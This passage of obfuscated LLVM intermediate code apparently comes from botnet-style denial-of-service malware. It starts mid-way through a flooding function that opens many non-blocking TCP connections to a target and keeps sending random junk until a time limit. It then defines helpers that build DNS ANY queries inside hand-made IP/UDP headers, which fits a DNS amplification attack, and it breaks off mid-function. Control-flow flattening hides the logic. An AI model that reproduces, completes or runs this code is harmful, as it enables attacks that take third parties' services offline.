  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %22 = call i32 @getdtablesize() #2
  %23 = sdiv i32 %22, 2
  store i32 %23, i32* %7, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %5, align 4
  %26 = trunc i32 %25 to i16
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = load i8*, i8** %4, align 8
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %31 = call i32 @getHost(i8* %29, %struct.in_addr* %30)
  store i32 %31, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1436805591, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar5 = load i32, i32* %switchVar
  switch i32 %switchVar5, label %switchDefault [
    i32 -1436805591, label %first
    i32 980268440, label %34
    i32 308459377, label %35
    i32 -1526516081, label %53
    i32 1802955168, label %59
    i32 -2040406628, label %60
    i32 -9554068, label %65
    i32 -1768828509, label %NodeBlock3
    i32 -1148381983, label %NodeBlock
    i32 -716972994, label %LeafBlock1
    i32 -862854691, label %LeafBlock
    i32 -1040680859, label %76
    i32 -57591357, label %107
    i32 2091767115, label %112
    i32 454119199, label %119
    i32 87429786, label %124
    i32 -789452895, label %125
    i32 -859326394, label %126
    i32 905571619, label %135
    i32 -319696154, label %136
    i32 495037045, label %168
    i32 1044145626, label %179
    i32 -1447292533, label %190
    i32 1765263530, label %195
    i32 504868898, label %196
    i32 -361377967, label %200
    i32 2024194139, label %211
    i32 1267392426, label %212
    i32 -667255410, label %213
    i32 -1740672246, label %228
    i32 -1661948918, label %233
    i32 -1599484965, label %244
    i32 247706888, label %NewDefault
    i32 -911236547, label %245
    i32 -382029741, label %246
    i32 2040063974, label %249
    i32 162135848, label %250
    i32 -420727780, label %252
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %32 = icmp ne i32 %.reload, 0
  %33 = select i1 %32, i32 980268440, i32 308459377
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -420727780, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store %struct.state_t* %41, %struct.state_t** %.reg2mem6
  %.reload26 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %42 = bitcast %struct.state_t* %.reload26 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 %45, i32 16, i1 false)
  %46 = call noalias i8* @malloc(i64 1024) #2
  store i8* %46, i8** %16, align 8
  %47 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 1024, i32 1, i1 false)
  store i32 1024, i32* %17, align 4
  %48 = call i64 @time(i64* null) #2
  %49 = load i32, i32* %6, align 4
  %50 = sext i32 %49 to i64
  %51 = add nsw i64 %48, %50
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %18, align 4
  store i32 -1526516081, i32* %switchVar
  br label %loopEnd

; <label>:53:                                     ; preds = %loopEntry
  %54 = load i32, i32* %18, align 4
  %55 = sext i32 %54 to i64
  %56 = call i64 @time(i64* null) #2
  %57 = icmp sgt i64 %55, %56
  %58 = select i1 %57, i32 1802955168, i32 162135848
  store i32 %58, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 0, i32* %8, align 4
  store i32 -2040406628, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %8, align 4
  %62 = load i32, i32* %7, align 4
  %63 = icmp slt i32 %61, %62
  %64 = select i1 %63, i32 -9554068, i32 2040063974
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %8, align 4
  %67 = sext i32 %66 to i64
  %.reload25 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %68 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload25, i64 %67
  %69 = getelementptr inbounds %struct.state_t, %struct.state_t* %68, i32 0, i32 1
  %70 = load i8, i8* %69, align 4
  %71 = zext i8 %70 to i32
  store i32 %71, i32* %.reg2mem27
  store i32 -1768828509, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload31 = load volatile i32, i32* %.reg2mem27
  %Pivot4 = icmp slt i32 %.reload31, 1
  %72 = select i1 %Pivot4, i32 -862854691, i32 -1148381983
  store i32 %72, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload29 = load volatile i32, i32* %.reg2mem27
  %Pivot = icmp slt i32 %.reload29, 2
  %73 = select i1 %Pivot, i32 -789452895, i32 -716972994
  store i32 %73, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload28 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf2 = icmp eq i32 %.reload28, 2
  %74 = select i1 %SwitchLeaf2, i32 -667255410, i32 247706888
  store i32 %74, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload30 = load volatile i32, i32* %.reg2mem27
  %SwitchLeaf = icmp eq i32 %.reload30, 0
  %75 = select i1 %SwitchLeaf, i32 -1040680859, i32 247706888
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %78 = load i32, i32* %8, align 4
  %79 = sext i32 %78 to i64
  %.reload24 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload24, i64 %79
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %80, i32 0, i32 0
  store i32 %77, i32* %81, align 8
  %82 = load i32, i32* %8, align 4
  %83 = sext i32 %82 to i64
  %.reload23 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %84 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload23, i64 %83
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 8
  %87 = load i32, i32* %8, align 4
  %88 = sext i32 %87 to i64
  %.reload22 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %89 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload22, i64 %88
  %90 = getelementptr inbounds %struct.state_t, %struct.state_t* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 8
  %92 = call i32 (i32, i32, ...) @fcntl(i32 %91, i32 3, i8* null)
  %93 = or i32 %92, 2048
  %94 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %93)
  %95 = load i32, i32* %8, align 4
  %96 = sext i32 %95 to i64
  %.reload21 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %97 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload21, i64 %96
  %98 = getelementptr inbounds %struct.state_t, %struct.state_t* %97, i32 0, i32 0
  %99 = load i32, i32* %98, align 8
  %100 = bitcast %union.__CONST_SOCKADDR_ARG* %19 to %struct.sockaddr**
  %101 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %101, %struct.sockaddr** %100, align 8
  %102 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %19, i32 0, i32 0
  %103 = load %struct.sockaddr*, %struct.sockaddr** %102, align 8
  %104 = call i32 @connect(i32 %99, %struct.sockaddr* %103, i32 16)
  %105 = icmp ne i32 %104, -1
  %106 = select i1 %105, i32 2091767115, i32 -57591357
  store i32 %106, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = call i32* @__errno_location() #13
  %109 = load i32, i32* %108, align 4
  %110 = icmp ne i32 %109, 115
  %111 = select i1 %110, i32 2091767115, i32 454119199
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = load i32, i32* %8, align 4
  %114 = sext i32 %113 to i64
  %.reload20 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %115 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload20, i64 %114
  %116 = getelementptr inbounds %struct.state_t, %struct.state_t* %115, i32 0, i32 0
  %117 = load i32, i32* %116, align 8
  %118 = call i32 @close(i32 %117)
  store i32 87429786, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %8, align 4
  %121 = sext i32 %120 to i64
  %.reload19 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %122 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload19, i64 %121
  %123 = getelementptr inbounds %struct.state_t, %struct.state_t* %122, i32 0, i32 1
  store i8 1, i8* %123, align 4
  store i32 87429786, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  store i32 -911236547, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  store i32 -859326394, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %128 = getelementptr inbounds [16 x i64], [16 x i64]* %127, i64 0, i64 0
  %129 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %128) #2, !srcloc !9
  %130 = extractvalue { i64, i64* } %129, 0
  %131 = extractvalue { i64, i64* } %129, 1
  %132 = trunc i64 %130 to i32
  store i32 %132, i32* %20, align 4
  %133 = ptrtoint i64* %131 to i64
  %134 = trunc i64 %133 to i32
  store i32 %134, i32* %21, align 4
  store i32 905571619, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  store i32 -319696154, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %8, align 4
  %138 = sext i32 %137 to i64
  %.reload18 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %139 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload18, i64 %138
  %140 = getelementptr inbounds %struct.state_t, %struct.state_t* %139, i32 0, i32 0
  %141 = load i32, i32* %140, align 8
  %142 = srem i32 %141, 64
  %143 = zext i32 %142 to i64
  %144 = shl i64 1, %143
  %145 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %146 = load i32, i32* %8, align 4
  %147 = sext i32 %146 to i64
  %.reload17 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %148 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload17, i64 %147
  %149 = getelementptr inbounds %struct.state_t, %struct.state_t* %148, i32 0, i32 0
  %150 = load i32, i32* %149, align 8
  %151 = sdiv i32 %150, 64
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds [16 x i64], [16 x i64]* %145, i64 0, i64 %152
  %154 = load i64, i64* %153, align 8
  %155 = or i64 %154, %144
  store i64 %155, i64* %153, align 8
  %156 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %156, align 8
  %157 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %157, align 8
  %158 = load i32, i32* %8, align 4
  %159 = sext i32 %158 to i64
  %.reload16 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %160 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload16, i64 %159
  %161 = getelementptr inbounds %struct.state_t, %struct.state_t* %160, i32 0, i32 0
  %162 = load i32, i32* %161, align 8
  %163 = add nsw i32 %162, 1
  %164 = call i32 @select(i32 %163, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %164, i32* %15, align 4
  %165 = load i32, i32* %15, align 4
  %166 = icmp eq i32 %165, 1
  %167 = select i1 %166, i32 495037045, i32 504868898
  store i32 %167, i32* %switchVar
  br label %loopEnd

; <label>:168:                                    ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %169 = load i32, i32* %8, align 4
  %170 = sext i32 %169 to i64
  %.reload15 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload15, i64 %170
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %171, i32 0, i32 0
  %173 = load i32, i32* %172, align 8
  %174 = bitcast i32* %14 to i8*
  %175 = call i32 @getsockopt(i32 %173, i32 1, i32 4, i8* %174, i32* %13) #2
  %176 = load i32, i32* %14, align 4
  %177 = icmp ne i32 %176, 0
  %178 = select i1 %177, i32 1044145626, i32 -1447292533
  store i32 %178, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i32, i32* %8, align 4
  %181 = sext i32 %180 to i64
  %.reload14 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %182 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload14, i64 %181
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %182, i32 0, i32 0
  %184 = load i32, i32* %183, align 8
  %185 = call i32 @close(i32 %184)
  %186 = load i32, i32* %8, align 4
  %187 = sext i32 %186 to i64
  %.reload13 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload13, i64 %187
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %188, i32 0, i32 1
  store i8 0, i8* %189, align 4
  store i32 1765263530, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i32, i32* %8, align 4
  %192 = sext i32 %191 to i64
  %.reload12 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %193 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload12, i64 %192
  %194 = getelementptr inbounds %struct.state_t, %struct.state_t* %193, i32 0, i32 1
  store i8 2, i8* %194, align 4
  store i32 1765263530, i32* %switchVar
  br label %loopEnd

; <label>:195:                                    ; preds = %loopEntry
  store i32 1267392426, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = load i32, i32* %15, align 4
  %198 = icmp eq i32 %197, -1
  %199 = select i1 %198, i32 -361377967, i32 2024194139
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i32, i32* %8, align 4
  %202 = sext i32 %201 to i64
  %.reload11 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %203 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload11, i64 %202
  %204 = getelementptr inbounds %struct.state_t, %struct.state_t* %203, i32 0, i32 0
  %205 = load i32, i32* %204, align 8
  %206 = call i32 @close(i32 %205)
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %.reload10 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload10, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 1
  store i8 0, i8* %210, align 4
  store i32 2024194139, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  store i32 1267392426, i32* %switchVar
  br label %loopEnd

; <label>:212:                                    ; preds = %loopEntry
  store i32 -911236547, i32* %switchVar
  br label %loopEnd

; <label>:213:                                    ; preds = %loopEntry
  %214 = call i32 @realrand(i32 32, i32 1024)
  store i32 %214, i32* %17, align 4
  %215 = load i8*, i8** %16, align 8
  %216 = load i32, i32* %17, align 4
  call void @makeRandomShit(i8* %215, i32 %216)
  %217 = load i32, i32* %8, align 4
  %218 = sext i32 %217 to i64
  %.reload9 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload9, i64 %218
  %220 = getelementptr inbounds %struct.state_t, %struct.state_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 8
  %222 = load i8*, i8** %16, align 8
  %223 = load i32, i32* %17, align 4
  %224 = sext i32 %223 to i64
  %225 = call i64 @send(i32 %221, i8* %222, i64 %224, i32 16384)
  %226 = icmp eq i64 %225, -1
  %227 = select i1 %226, i32 -1740672246, i32 -1599484965
  store i32 %227, i32* %switchVar
  br label %loopEnd

; <label>:228:                                    ; preds = %loopEntry
  %229 = call i32* @__errno_location() #13
  %230 = load i32, i32* %229, align 4
  %231 = icmp ne i32 %230, 11
  %232 = select i1 %231, i32 -1661948918, i32 -1599484965
  store i32 %232, i32* %switchVar
  br label %loopEnd

; <label>:233:                                    ; preds = %loopEntry
  %234 = load i32, i32* %8, align 4
  %235 = sext i32 %234 to i64
  %.reload8 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %236 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload8, i64 %235
  %237 = getelementptr inbounds %struct.state_t, %struct.state_t* %236, i32 0, i32 0
  %238 = load i32, i32* %237, align 8
  %239 = call i32 @close(i32 %238)
  %240 = load i32, i32* %8, align 4
  %241 = sext i32 %240 to i64
  %.reload7 = load volatile %struct.state_t*, %struct.state_t** %.reg2mem6
  %242 = getelementptr inbounds %struct.state_t, %struct.state_t* %.reload7, i64 %241
  %243 = getelementptr inbounds %struct.state_t, %struct.state_t* %242, i32 0, i32 1
  store i8 0, i8* %243, align 4
  store i32 -1599484965, i32* %switchVar
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  store i32 -911236547, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -911236547, i32* %switchVar
  br label %loopEnd

; <label>:245:                                    ; preds = %loopEntry
  store i32 -382029741, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i32, i32* %8, align 4
  %248 = add nsw i32 %247, 1
  store i32 %248, i32* %8, align 4
  store i32 -2040406628, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  store i32 -1526516081, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %251)
  store i32 -420727780, i32* %switchVar
  br label %loopEnd

; <label>:252:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %250, %249, %246, %245, %NewDefault, %244, %233, %228, %213, %212, %211, %200, %196, %195, %190, %179, %168, %136, %135, %126, %125, %124, %119, %112, %107, %76, %LeafBlock, %LeafBlock1, %NodeBlock, %NodeBlock3, %65, %60, %59, %53, %35, %34, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @dns_format(i8*, i8*) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  store i32 0, i32* %5, align 4
  %7 = load i8*, i8** %4, align 8
  %8 = call i8* @strcat(i8* %7, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #2
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -65119611, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -65119611, label %9
    i32 449738376, label %16
    i32 1798914185, label %25
    i32 240273437, label %32
    i32 -982416982, label %37
    i32 721188550, label %45
    i32 -1492960201, label %48
    i32 -354198590, label %51
    i32 -1432576395, label %52
    i32 2134658003, label %55
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %6, align 4
  %11 = sext i32 %10 to i64
  %12 = load i8*, i8** %4, align 8
  %13 = call i64 @strlen(i8* %12) #10
  %14 = icmp ult i64 %11, %13
  %15 = select i1 %14, i32 449738376, i32 2134658003
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %6, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp eq i32 %22, 46
  %24 = select i1 %23, i32 1798914185, i32 -354198590
  store i32 %24, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i32, i32* %6, align 4
  %27 = load i32, i32* %5, align 4
  %28 = sub nsw i32 %26, %27
  %29 = trunc i32 %28 to i8
  %30 = load i8*, i8** %3, align 8
  %31 = getelementptr inbounds i8, i8* %30, i32 1
  store i8* %31, i8** %3, align 8
  store i8 %29, i8* %30, align 1
  store i32 240273437, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = load i32, i32* %5, align 4
  %34 = load i32, i32* %6, align 4
  %35 = icmp slt i32 %33, %34
  %36 = select i1 %35, i32 -982416982, i32 -1492960201
  store i32 %36, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %4, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  store i8 %42, i8* %43, align 1
  store i32 721188550, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %5, align 4
  %47 = add nsw i32 %46, 1
  store i32 %47, i32* %5, align 4
  store i32 240273437, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %5, align 4
  %50 = add nsw i32 %49, 1
  store i32 %50, i32* %5, align 4
  store i32 -354198590, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -1432576395, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %6, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %6, align 4
  store i32 -65119611, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i8*, i8** %3, align 8
  %57 = getelementptr inbounds i8, i8* %56, i32 1
  store i8* %57, i8** %3, align 8
  store i8 0, i8* %56, align 1
  ret void

loopEnd:                                          ; preds = %52, %51, %48, %45, %37, %32, %25, %16, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define void @dns_hdr_create(%struct.dns_hdr*) #0 {
  %2 = alloca %struct.dns_hdr*, align 8
  store %struct.dns_hdr* %0, %struct.dns_hdr** %2, align 8
  %3 = call i32 @getpid() #2
  %4 = trunc i32 %3 to i16
  %5 = call zeroext i16 @htons(i16 zeroext %4) #13
  %6 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %7 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %6, i32 0, i32 0
  store i16 %5, i16* %7, align 2
  %8 = call zeroext i16 @htons(i16 zeroext 256) #13
  %9 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %10 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %9, i32 0, i32 1
  store i16 %8, i16* %10, align 2
  %11 = call zeroext i16 @htons(i16 zeroext 1) #13
  %12 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %13 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %12, i32 0, i32 2
  store i16 %11, i16* %13, align 2
  %14 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %15 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %14, i32 0, i32 3
  store i16 0, i16* %15, align 2
  %16 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %17 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %16, i32 0, i32 4
  store i16 0, i16* %17, align 2
  %18 = load %struct.dns_hdr*, %struct.dns_hdr** %2, align 8
  %19 = getelementptr inbounds %struct.dns_hdr, %struct.dns_hdr* %18, i32 0, i32 5
  store i16 0, i16* %19, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @dns_send(i8*, i32, i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca [128 x i8], align 16
  %10 = alloca %struct.dns_hdr*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca [32 x i8], align 16
  %13 = alloca %struct.query*, align 8
  %14 = alloca [4096 x i8], align 16
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.iphdr*, align 8
  %19 = alloca %struct.udphdr*, align 8
  %20 = alloca %struct.ps_hdr, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  store i8* %3, i8** %8, align 8
  %24 = bitcast [128 x i8]* %9 to %struct.dns_hdr*
  store %struct.dns_hdr* %24, %struct.dns_hdr** %10, align 8
  %25 = load %struct.dns_hdr*, %struct.dns_hdr** %10, align 8
  call void @dns_hdr_create(%struct.dns_hdr* %25)
  %26 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 12
  store i8* %26, i8** %11, align 8
  %27 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i32 0, i32 0
  %28 = load i8*, i8** %8, align 8
  %29 = call i8* @strcpy(i8* %27, i8* %28) #2
  %30 = load i8*, i8** %11, align 8
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %12, i32 0, i32 0
  call void @dns_format(i8* %30, i8* %31)
  %32 = load i8*, i8** %11, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = add i64 %33, 1
  %35 = add i64 12, %34
  %36 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 %35
  %37 = bitcast i8* %36 to %struct.query*
  store %struct.query* %37, %struct.query** %13, align 8
  %38 = call zeroext i16 @htons(i16 zeroext 255) #13
  %39 = load %struct.query*, %struct.query** %13, align 8
  %40 = getelementptr inbounds %struct.query, %struct.query* %39, i32 0, i32 0
  store i16 %38, i16* %40, align 2
  %41 = call zeroext i16 @htons(i16 zeroext 1) #13
  %42 = load %struct.query*, %struct.query** %13, align 8
  %43 = getelementptr inbounds %struct.query, %struct.query* %42, i32 0, i32 1
  store i16 %41, i16* %43, align 2
  %44 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 4096, i32 16, i1 false)
  %45 = getelementptr inbounds [4096 x i8], [4096 x i8]* %14, i32 0, i32 0
  %46 = getelementptr inbounds i8, i8* %45, i64 20
  %47 = getelementptr inbounds i8, i8* %46, i64 8
  store i8* %47, i8** %15, align 8
  %48 = load i8*, i8** %15, align 8
  %49 = bitcast [128 x i8]* %9 to i8*
  %50 = load i8*, i8** %11, align 8
  %51 = call i64 @strlen(i8* %50) #10
  %52 = add i64 %51, 1
  %53 = add i64 12, %52
  %54 = add i64 %53, 4
  %55 = add i64 %54, 1
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %48, i8* %49, i64 %55, i32 1, i1 false)
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext 53) #13
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  %59 = load i8*, i8** %7, align 8
  %60 = call i32 @inet_addr(i8* %59) #2
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
